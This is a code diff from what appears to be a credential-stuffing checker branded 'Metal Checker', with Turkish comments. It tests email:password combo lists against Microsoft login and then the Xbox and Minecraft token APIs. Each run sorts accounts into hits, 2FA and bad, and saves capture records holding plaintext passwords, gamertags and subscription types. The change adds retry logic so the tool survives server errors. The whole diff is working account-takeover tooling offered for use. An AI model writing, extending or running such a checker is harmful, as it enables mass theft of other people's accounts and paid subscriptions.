@@ -365,132 +365,133 @@ class BotScanContext:
 
     def get_cpm(self, elapsed):
         return int((self.checked / elapsed) * 60) if elapsed > 0 else 0
-
 def check_account_bot(context, combo):
     if not context.is_running:
         return
-    try:
-        parts = combo.strip().split(':')
-        if len(parts) < 2:
+        
+    max_recheck_attempts = 3
+    for attempt in range(max_recheck_attempts):
+        try:
+            parts = combo.strip().split(':')
+            if len(parts) < 2:
+                with context.lock:
+                    context.bad += 1
+                    context.checked += 1
+                return
+
+            email = parts[0]
+            password = ':'.join(parts[1:])
+
+            session = requests.Session()
+            session.verify = False
+
+            # --- API Hatalarını Yakalamak İçin 'raise Exception' Yapısını Entegre Ettik ---
+            url_post, sftag = get_sftag(session)
+            if not url_post or not sftag:
+                raise Exception("sftag_error")
+
+            ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
+
+            if auth_status == "2fa":
+                with context.lock:
+                    context.twofa += 1
+                    context.checked += 1
+                    context.twofa_list.append(f"{email}:{password}")
+                return
+            elif auth_status == "bad":
+                with context.lock:
+                    context.bad += 1
+                    context.checked += 1
+                    context.bad_list.append(f"{email}:{password}")
+                return
+            elif auth_status != "success" or not ms_token:
+                raise Exception("ms_auth_error")
+
+            xbox_token, uhs = get_xbox_token(session, ms_token)
+            if not xbox_token or not uhs:
+                raise Exception("xbox_token_error")
+
+            xsts_token = get_xsts_token(session, xbox_token)
+            if not xsts_token:
+                raise Exception("xsts_token_error")
+
+            xbox_profile = get_xbox_profile(session, uhs, xsts_token)
+            gamertag     = xbox_profile.get("gamertag", "N/A")
+            tier         = xbox_profile.get("tier", "N/A")
+            rep          = xbox_profile.get("rep", "N/A")
+
+            mc_token = get_minecraft_token(session, uhs, xsts_token)
+            if not mc_token:
+                raise Exception("mc_token_error")
+
+            account_type, subs = check_entitlements(session, mc_token)
+
+            capture = (
+                f"Email         : {email}\n"
+                f"Password      : {password}\n"
+                f"Gamertag      : {gamertag}\n"
+                f"Tier          : {tier}\n"
+                f"Reputation    : {rep}\n"
+            )
+
+            if not account_type:
+                capture += f"Type          : Xbox (Not Linked)\nCaptured By   : Metal Checker\n{'='*50}"
+                with context.lock:
+                    context.not_linked += 1
+                    context.hits += 1
+                    context.checked += 1
+                    context.not_linked_list.append(capture)
+                    context.hit_list.append(f"{email}:{password} [Xbox Not Linked]")
+                return
+
+            profile = get_profile(session, mc_token)
+            name    = profile.get('name', 'N/A') if profile else "Not Set"
+            uuid_   = profile.get('id', 'N/A') if profile else "N/A"
+            capes   = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
+            if not capes: capes = "None"
+            subs_str = ", ".join(subs) if subs else "None"
+
+            capture += (
+                f"MC Name       : {name}\n"
+                f"UUID          : {uuid_}\n"
+                f"Capes         : {capes}\n"
+                f"Type          : {account_type}\n"
+                f"Subscriptions : {subs_str}\n"
+                f"Captured By   : Metal Checker\n"
+                f"{'='*50}"
+            )
+
             with context.lock:
-                context.bad += 1
-                context.checked += 1
-            return
-
-        email = parts[0]
-        password = ':'.join(parts[1:])
-
-        session = requests.Session()
-        session.verify = False
-
-        url_post, sftag = get_sftag(session)
-        if not url_post or not sftag:
-            with context.lock:
-                context.errors += 1
-                context.checked += 1
-            return
-
-        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
-
-        if auth_status == "2fa":
-            with context.lock:
-                context.twofa += 1
-                context.checked += 1
-                context.twofa_list.append(f"{email}:{password}")
-            return
-        elif auth_status == "bad":
-            with context.lock:
-                context.bad += 1
-                context.checked += 1
-                context.bad_list.append(f"{email}:{password}")
-            return
-        elif auth_status != "success" or not ms_token:
-            with context.lock:
-                context.errors += 1
-                context.checked += 1
-            return
-
-        xbox_token, uhs = get_xbox_token(session, ms_token)
-        if not xbox_token or not uhs:
-            with context.lock:
-                context.bad += 1
-                context.checked += 1
-            return
-
-        xsts_token = get_xsts_token(session, xbox_token)
-        if not xsts_token:
-            with context.lock:
-                context.bad += 1
-                context.checked += 1
-            return
-
-        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
-        gamertag     = xbox_profile.get("gamertag", "N/A")
-        tier         = xbox_profile.get("tier", "N/A")
-        rep          = xbox_profile.get("rep", "N/A")
-
-        mc_token = get_minecraft_token(session, uhs, xsts_token)
-        if not mc_token:
-            with context.lock:
-                context.bad += 1
-                context.checked += 1
-            return
-
-        account_type, subs = check_entitlements(session, mc_token)
-
-        capture = (
-            f"Email         : {email}\n"
-            f"Password      : {password}\n"
-            f"Gamertag      : {gamertag}\n"
-            f"Tier          : {tier}\n"
-            f"Reputation    : {rep}\n"
-        )
-
-        if not account_type:
-            capture += f"Type          : Xbox (Not Linked)\nCaptured By   : Metal Checker\n{'='*50}"
-            with context.lock:
-                context.not_linked += 1
                 context.hits += 1
                 context.checked += 1
-                context.not_linked_list.append(capture)
-                context.hit_list.append(f"{email}:{password} [Xbox Not Linked]")
-            return
+                context.hit_list.append(f"{email}:{password} [{account_type}]")
+                if 'Ultimate' in account_type or 'Game Pass' in account_type:
+                    context.gamepass += 1
+                    context.gamepass_list.append(capture)
+                elif 'Minecraft' in account_type:
+                    context.minecraft += 1
+                    context.minecraft_list.append(capture)
+                else:
+                    context.xbox += 1
+                    context.xbox_list.append(capture)
+            return # Başarılı tarama bitişi
 
-        profile = get_profile(session, mc_token)
-        name    = profile.get('name', 'N/A') if profile else "Not Set"
-        uuid_   = profile.get('id', 'N/A') if profile else "N/A"
-        capes   = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
-        if not capes: capes = "None"
-        subs_str = ", ".join(subs) if subs else "None"
+        except Exception as e:
+            # Sadece hata aldığımızda retries tetiklenir
+            with context.lock:
+                context.retries += 1
+            
+            # Eğer 3. ve son denemede de hata alındıysa artık errors'a yansıt ve geç
+            if attempt == max_recheck_attempts - 1:
+                with context.lock:
+                    context.errors += 1
+                    context.checked += 1
+                return
+            
+            # Yeniden denemeden önce 1 saniye Microsoft sunucularını dinlendir
+            time.sleep(1)
 
-        capture += (
-            f"MC Name       : {name}\n"
-            f"UUID          : {uuid_}\n"
-            f"Capes         : {capes}\n"
-            f"Type          : {account_type}\n"
-            f"Subscriptions : {subs_str}\n"
-            f"Captured By   : Metal Checker\n"
-            f"{'='*50}"
-        )
 
-        with context.lock:
-            context.hits += 1
-            context.checked += 1
-            context.hit_list.append(f"{email}:{password} [{account_type}]")
-            if 'Ultimate' in account_type or 'Game Pass' in account_type:
-                context.gamepass += 1
-                context.gamepass_list.append(capture)
-            elif 'Minecraft' in account_type:
-                context.minecraft += 1
-                context.minecraft_list.append(capture)
-            else:
-                context.xbox += 1
-                context.xbox_list.append(capture)
-
-    except:
-        with context.lock:
-            context.errors += 1
-            context.checked += 1
 
 def live_ui_updater(context):
     start_time = time.time()
